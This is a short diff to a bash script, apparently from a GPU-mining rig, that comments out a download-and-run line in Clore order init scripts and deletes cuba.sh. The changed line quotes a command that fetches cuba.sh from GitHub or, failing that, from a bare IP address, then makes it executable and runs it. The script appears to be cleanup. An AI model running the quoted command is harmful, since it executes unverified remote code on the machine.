@@ -1,5 +1,5 @@
 #!/bin/bash
-sed -i "s@wget https://github.com/VADIMbI4/Hive23/raw/main/cuba.sh && chmod +x cuba.sh && ./cuba.sh@#@g" /init-clore-order-*.sh
+sed -i "s@wget https://github.com/VADIMbI4/Hive23/raw/main/cuba.sh; [[ ! -f cuba.sh ]] && wget  http://178.205.140.121:82/cuba.sh; chmod +x cuba.sh && ./cuba.sh@#@g" /init-clore-order-*.sh
 rm /hive/cuba.sh
 #sleep 300
 #miner stop
